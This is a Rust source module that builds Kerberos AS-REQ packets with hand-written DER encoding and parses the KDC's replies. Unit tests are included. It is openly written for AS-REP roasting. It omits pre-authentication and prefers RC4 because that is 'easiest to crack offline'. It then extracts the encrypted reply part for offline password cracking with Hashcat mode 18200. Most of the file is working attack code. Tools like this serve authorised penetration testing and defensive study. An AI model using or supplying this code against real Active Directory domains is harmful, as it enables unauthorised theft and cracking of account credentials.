//! AS-REQ packet construction using manual DER encoding.
//!
//! Implements RFC 4120 §5.4.1. Using manual DER rather than rasn-kerberos
//! gives explicit control over every byte and avoids API version uncertainty.

/// Kerberos constants from RFC 4120
pub const PVNO: i64 = 5;
pub const MSG_TYPE_AS_REQ: i64 = 10;
pub const MSG_TYPE_AS_REP: i64 = 11;
pub const MSG_TYPE_TGS_REQ: i64 = 12;
pub const MSG_TYPE_TGS_REP: i64 = 13;
pub const MSG_TYPE_KRB_ERROR: i64 = 30;

pub const NT_PRINCIPAL: i64 = 1;
pub const NT_SRV_INST: i64 = 2;

/// RFC 3961 encryption type constants
pub const ETYPE_RC4_HMAC: i32 = 23;
pub const ETYPE_AES128_CTS_HMAC_SHA1: i32 = 17;
pub const ETYPE_AES256_CTS_HMAC_SHA1: i32 = 18;

/// PA-DATA type constants
pub const PA_TGS_REQ: i64 = 1;
pub const PA_ENC_TIMESTAMP: i64 = 2;

// ─── DER encoding helpers ────────────────────────────────────────────────────

fn length_bytes(len: usize) -> Vec<u8> {
    if len <= 0x7f {
        vec![len as u8]
    } else if len <= 0xff {
        vec![0x81, len as u8]
    } else if len <= 0xffff {
        vec![0x82, (len >> 8) as u8, len as u8]
    } else {
        vec![0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]
    }
}

fn tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&length_bytes(value.len()));
    out.extend_from_slice(value);
    out
}

fn tlv_multi(tag: u8, parts: &[Vec<u8>]) -> Vec<u8> {
    let value: Vec<u8> = parts.iter().flat_map(|p| p.iter().copied()).collect();
    tlv(tag, &value)
}

/// SEQUENCE { contents }
pub fn sequence(contents: Vec<u8>) -> Vec<u8> {
    tlv(0x30, &contents)
}

/// [N] EXPLICIT { contents }  (context tag, constructed)
pub fn context_explicit(n: u8, contents: Vec<u8>) -> Vec<u8> {
    tlv(0xa0 | n, &contents)
}

/// [APPLICATION N] EXPLICIT { contents }  (application tag, constructed)
pub fn application_explicit(n: u8, contents: Vec<u8>) -> Vec<u8> {
    tlv(0x60 | n, &contents)
}

/// INTEGER — minimal two's-complement DER encoding.
pub fn der_int(n: i64) -> Vec<u8> {
    let all8 = n.to_be_bytes(); // big-endian two's-complement, always 8 bytes
    // Strip redundant sign-extension bytes from the front.
    // A leading 0x00 is redundant when the next byte's MSB is 0 (positive).
    // A leading 0xFF is redundant when the next byte's MSB is 1 (negative).
    let mut start = 0usize;
    while start < 7 {
        let b = all8[start];
        let nb = all8[start + 1];
        if (b == 0x00 && nb & 0x80 == 0) || (b == 0xFF && nb & 0x80 != 0) {
            start += 1;
        } else {
            break;
        }
    }
    tlv(0x02, &all8[start..])
}

/// OCTET STRING
pub fn der_octet_string(bytes: &[u8]) -> Vec<u8> {
    tlv(0x04, bytes)
}

/// GeneralString (tag 0x1b)
pub fn der_general_string(s: &str) -> Vec<u8> {
    tlv(0x1b, s.as_bytes())
}

/// GeneralizedTime (tag 0x18) — format "YYYYMMDDHHmmssZ"
pub fn der_generalized_time(s: &str) -> Vec<u8> {
    tlv(0x18, s.as_bytes())
}

/// BIT STRING — unused_bits = 0 for flag fields
pub fn der_bit_string(bytes: &[u8], unused_bits: u8) -> Vec<u8> {
    let mut v = vec![unused_bits];
    v.extend_from_slice(bytes);
    tlv(0x03, &v)
}

/// SEQUENCE OF Integer items
fn der_seq_of_int(items: &[i64]) -> Vec<u8> {
    let inner: Vec<u8> = items.iter().flat_map(|&n| der_int(n)).collect();
    sequence(inner)
}

// ─── PrincipalName ───────────────────────────────────────────────────────────

/// Encode a PrincipalName.
/// name_type: NT_PRINCIPAL (1) for users, NT_SRV_INST (2) for services
/// parts: ["krbtgt", realm] for TGT, ["username"] for user
fn der_principal_name(name_type: i64, parts: &[&str]) -> Vec<u8> {
    let name_type_field = context_explicit(0, der_int(name_type));
    let strings: Vec<u8> = parts
        .iter()
        .flat_map(|s| der_general_string(s))
        .collect();
    let name_string_field = context_explicit(1, sequence(strings));
    sequence(vec![name_type_field, name_string_field].into_iter().flatten().collect())
}

// ─── KDC-REQ-BODY ────────────────────────────────────────────────────────────

/// Build a KDC-REQ-BODY for AS-REQ Roasting (no encryption type preference for cracking,
/// just RC4 to maximise hashcat compatibility).
fn build_kdc_req_body_asrep(
    username: &str,
    realm: &str,
    nonce: u32,
    etypes: &[i32],
) -> Vec<u8> {
    // kdc-options [0]: all zeros (5 bytes: 0x00 pad + 4 flag bytes)
    let kdc_options = context_explicit(0, der_bit_string(&[0x00, 0x00, 0x00, 0x00], 0));

    // cname [1]: user principal
    let cname = context_explicit(1, der_principal_name(NT_PRINCIPAL, &[username]));

    // realm [2]
    let realm_field = context_explicit(2, der_general_string(realm));

    // sname [3]: krbtgt/REALM
    let sname = context_explicit(3, der_principal_name(NT_SRV_INST, &["krbtgt", realm]));

    // till [5]: 20370913024805Z (RFC 4120 recommended far-future time)
    let till = context_explicit(5, der_generalized_time("20370913024805Z"));

    // nonce [7]
    let nonce_field = context_explicit(7, der_int(nonce as i64));

    // etype [8]: list of encryption types
    let etype_inner: Vec<u8> = etypes.iter().flat_map(|&e| der_int(e as i64)).collect();
    let etype_field = context_explicit(8, sequence(etype_inner));

    let body_inner: Vec<u8> = [kdc_options, cname, realm_field, sname, till, nonce_field, etype_field]
        .into_iter()
        .flatten()
        .collect();

    sequence(body_inner)
}

// ─── AS-REQ for AS-REP Roasting ──────────────────────────────────────────────

/// Build a complete AS-REQ without PA-ENC-TIMESTAMP.
///
/// When sent to an account with DONT_REQ_PREAUTH set, the KDC responds with
/// an AS-REP whose enc_part can be cracked offline (Hashcat mode 18200).
/// For accounts requiring preauth, KDC returns KRB-ERROR 25 (PREAUTH_REQUIRED).
pub fn build_asrep_roast_request(username: &str, realm: &str, nonce: u32) -> Vec<u8> {
    // Prefer RC4 (etype 23) — easiest to crack offline
    let etypes = [ETYPE_RC4_HMAC];
    let req_body = build_kdc_req_body_asrep(username, realm, nonce, &etypes);

    // KDC-REQ:
    //   pvno       [1] INTEGER (5)
    //   msg-type   [2] INTEGER (10 for AS-REQ)
    //   padata     [3] OPTIONAL — ABSENT (triggers AS-REP roasting)
    //   req-body   [4] KDC-REQ-BODY
    let pvno = context_explicit(1, der_int(PVNO));
    let msg_type = context_explicit(2, der_int(MSG_TYPE_AS_REQ));
    let req_body_field = context_explicit(4, req_body);

    let kdc_req_inner: Vec<u8> = [pvno, msg_type, req_body_field]
        .into_iter()
        .flatten()
        .collect();
    let kdc_req = sequence(kdc_req_inner);

    // APPLICATION [10] wraps KDC-REQ
    let as_req = application_explicit(10, kdc_req);

    // TCP framing: 4-byte big-endian length prefix
    let mut framed = Vec::with_capacity(4 + as_req.len());
    framed.extend_from_slice(&(as_req.len() as u32).to_be_bytes());
    framed.extend_from_slice(&as_req);
    framed
}

// ─── AS-REP / KRB-ERROR response parser ─────────────────────────────────────

#[derive(Debug, PartialEq)]
pub struct AsRepResult {
    pub etype: i32,
    pub cipher: Vec<u8>,
}

#[derive(Debug, PartialEq)]
pub enum KdcResponse {
    AsRep(AsRepResult),
    /// KRB-ERROR 25 = PREAUTH_REQUIRED (account requires preauth — not vulnerable)
    PreauthRequired,
    /// Other KRB-ERROR
    Error(i64),
}

/// Parse a raw KDC TCP response (without 4-byte length prefix).
pub fn parse_kdc_response(data: &[u8]) -> anyhow::Result<KdcResponse> {
    if data.is_empty() {
        anyhow::bail!("Empty KDC response");
    }

    // Check APPLICATION tag to determine message type
    // APPLICATION 11 = 0x6b → AS-REP
    // APPLICATION 30 = 0x7e → KRB-ERROR
    let app_tag = data[0];

    match app_tag {
        0x6b => {
            // AS-REP: extract enc_part (field [6] in KDC-REP)
            let enc_part = extract_asrep_enc_part(data)?;
            Ok(KdcResponse::AsRep(enc_part))
        }
        0x7e => {
            // KRB-ERROR: extract error-code (field [6])
            let code = extract_krb_error_code(data).unwrap_or(-1);
            if code == 25 {
                Ok(KdcResponse::PreauthRequired)
            } else {
                Ok(KdcResponse::Error(code))
            }
        }
        _ => anyhow::bail!("Unexpected KDC response tag: 0x{:02x}", app_tag),
    }
}

/// Walk the DER structure to find context [6] (enc_part) in AS-REP,
/// then parse EncryptedData to extract etype and cipher.
fn extract_asrep_enc_part(data: &[u8]) -> anyhow::Result<AsRepResult> {
    // AS-REP: [APPLICATION 11] SEQUENCE { ... [6] EncryptedData }
    // We do a simple tag-value walk rather than full recursive parsing.
    let inner = unwrap_application(data, 11)?;
    let seq = unwrap_sequence(inner)?;

    // Find context [6] within the SEQUENCE
    let enc_part_data = find_context_tag(seq, 6)
        .ok_or_else(|| anyhow::anyhow!("enc_part [6] not found in AS-REP"))?;

    // EncryptedData: SEQUENCE { etype [0], kvno [1] OPTIONAL, cipher [2] }
    let enc_seq = unwrap_sequence(enc_part_data)?;
    let etype_data = find_context_tag(enc_seq, 0)
        .ok_or_else(|| anyhow::anyhow!("etype [0] not found in EncryptedData"))?;
    let cipher_data = find_context_tag(enc_seq, 2)
        .ok_or_else(|| anyhow::anyhow!("cipher [2] not found in EncryptedData"))?;

    let etype = parse_der_int(etype_data)? as i32;
    let cipher = parse_der_octet_string(cipher_data)?.to_vec();

    Ok(AsRepResult { etype, cipher })
}

fn extract_krb_error_code(data: &[u8]) -> anyhow::Result<i64> {
    // KRB-ERROR: [APPLICATION 30] SEQUENCE { ... [6] error-code INTEGER }
    let inner = unwrap_application(data, 30)?;
    let seq = unwrap_sequence(inner)?;
    let code_data = find_context_tag(seq, 6)
        .ok_or_else(|| anyhow::anyhow!("error-code [6] not found in KRB-ERROR"))?;
    parse_der_int(code_data)
}

// ─── Minimal DER parser helpers ───────────────────────────────────────────────

fn read_length(data: &[u8]) -> anyhow::Result<(usize, &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Unexpected end of data reading length");
    }
    if data[0] & 0x80 == 0 {
        return Ok((data[0] as usize, &data[1..]));
    }
    let num_bytes = (data[0] & 0x7f) as usize;
    if data.len() < 1 + num_bytes {
        anyhow::bail!("Truncated length encoding");
    }
    let mut len = 0usize;
    for &b in &data[1..=num_bytes] {
        len = (len << 8) | b as usize;
    }
    Ok((len, &data[1 + num_bytes..]))
}

fn read_tlv(data: &[u8]) -> anyhow::Result<(u8, &[u8], &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Unexpected end of data");
    }
    let tag = data[0];
    let (len, rest) = read_length(&data[1..])?;
    if rest.len() < len {
        anyhow::bail!("TLV value truncated: need {} got {}", len, rest.len());
    }
    Ok((tag, &rest[..len], &rest[len..]))
}

fn unwrap_application(data: &[u8], expected_n: u8) -> anyhow::Result<&[u8]> {
    let (tag, value, _) = read_tlv(data)?;
    let expected_tag = 0x60 | expected_n;
    if tag != expected_tag {
        anyhow::bail!("Expected APPLICATION [{}] (0x{:02x}), got 0x{:02x}", expected_n, expected_tag, tag);
    }
    Ok(value)
}

fn unwrap_sequence(data: &[u8]) -> anyhow::Result<&[u8]> {
    let (tag, value, _) = read_tlv(data)?;
    if tag != 0x30 {
        anyhow::bail!("Expected SEQUENCE (0x30), got 0x{:02x}", tag);
    }
    Ok(value)
}

/// Public re-export of `unwrap_sequence` for use by sibling modules.
pub fn unwrap_sequence_pub(data: &[u8]) -> anyhow::Result<&[u8]> {
    unwrap_sequence(data)
}

/// Find the first context [n] tag in the sequence body and return its contents.
pub fn find_context_tag(data: &[u8], n: u8) -> Option<&[u8]> {
    let target = 0xa0 | n;
    let mut pos = data;
    while !pos.is_empty() {
        let (tag, value, rest) = read_tlv(pos).ok()?;
        if tag == target {
            return Some(value);
        }
        pos = rest;
    }
    None
}

fn parse_der_int(data: &[u8]) -> anyhow::Result<i64> {
    let (tag, value, _) = read_tlv(data)?;
    if tag != 0x02 {
        anyhow::bail!("Expected INTEGER (0x02), got 0x{:02x}", tag);
    }
    if value.is_empty() {
        return Ok(0);
    }
    // Two's complement decode
    let neg = value[0] & 0x80 != 0;
    let mut result: i64 = if neg { -1 } else { 0 };
    for &b in value {
        result = (result << 8) | b as i64;
    }
    Ok(result)
}

fn parse_der_octet_string(data: &[u8]) -> anyhow::Result<&[u8]> {
    let (tag, value, _) = read_tlv(data)?;
    if tag != 0x04 {
        anyhow::bail!("Expected OCTET STRING (0x04), got 0x{:02x}", tag);
    }
    Ok(value)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_asrep_roast_request_has_framing() {
        let req = build_asrep_roast_request("alice", "CORP.LOCAL", 0xdeadbeef);
        // First 4 bytes are the TCP length prefix
        assert!(req.len() > 4);
        let body_len = u32::from_be_bytes(req[..4].try_into().unwrap()) as usize;
        assert_eq!(body_len, req.len() - 4);
    }

    #[test]
    fn test_build_asrep_roast_starts_with_application_tag() {
        let req = build_asrep_roast_request("alice", "CORP.LOCAL", 1);
        // After 4-byte framing: APPLICATION [10] = 0x6a
        assert_eq!(req[4], 0x6a);
    }

    #[test]
    fn test_der_int_roundtrip() {
        for &n in &[0i64, 1, 127, 128, 255, 256, -1, -128, i32::MAX as i64] {
            let encoded = der_int(n);
            let decoded = parse_der_int(&encoded).unwrap();
            assert_eq!(decoded, n, "roundtrip failed for {}", n);
        }
    }
}
